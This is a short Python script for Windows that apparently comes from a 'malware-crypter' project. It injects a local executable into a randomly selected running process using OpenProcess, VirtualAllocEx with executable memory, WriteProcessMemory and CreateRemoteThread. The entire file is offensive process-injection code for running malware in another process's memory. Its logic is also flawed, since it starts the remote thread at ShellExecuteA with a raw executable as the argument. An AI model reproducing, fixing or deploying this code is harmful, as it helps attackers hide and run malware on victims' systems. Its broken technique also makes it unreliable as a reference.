import ctypes
import psutil
import random

# Get a list of running processes
processes = [proc for proc in psutil.process_iter()]

# Select a random process and print the id and name of the process
selected_proc = random.choice(processes)
process_name = psutil.Process(selected_proc.pid).name()
print(f"Selected process: {selected_proc.pid}")
print(f"Process name: {process_name}")

# Check if the selected process is still running
if not selected_proc.is_running():
    print(f"Process {selected_proc.pid} is not running")
    exit()

# Get a handle to the running process
PROCESS_ALL_ACCESS = 0x1F0FFF
process_id = selected_proc.pid
process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)

executable = open(r'C:\Users\John Emro\Documents\GitHub\malware-crypter\MW_onmemory\create_file.exe', 'rb').read()
buffer_size = len(executable)

# Allocate memory in the remote process
allocation_base = ctypes.windll.kernel32.VirtualAllocEx(process_handle, None, buffer_size, 0x3000, 0x40)

if not allocation_base:
    raise ctypes.WinError()

# Write the executable into the allocated memory
ctypes.windll.kernel32.WriteProcessMemory(process_handle, allocation_base, executable, buffer_size, None)

# Get a function pointer to the entry point of the executable
kernel32 = ctypes.WinDLL('kernel32')
shell32 = kernel32.LoadLibraryA(b'shell32.dll')
entry_point = kernel32.GetProcAddress(shell32, b'ShellExecuteA')

# Call the entry point
thread_id = ctypes.c_ulong(0)
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point, allocation_base, 0, ctypes.byref(thread_id))

# Close the process handle to avoid handle leaks
ctypes.windll.kernel32.CloseHandle(process_handle)
